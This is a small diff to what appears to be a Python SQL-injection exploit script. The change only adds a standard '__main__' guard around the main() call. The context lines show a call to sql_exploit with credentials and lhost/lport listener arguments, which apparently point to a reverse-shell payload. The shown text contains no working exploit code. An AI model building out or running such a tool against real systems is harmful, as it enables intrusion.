@@ -73,4 +73,5 @@ def main():
     url1 = string_fix(url1)
     sql_exploit(url1,username,password,lhost,lport)
 
-main()
+if __name__ == "__main__":
+    main()
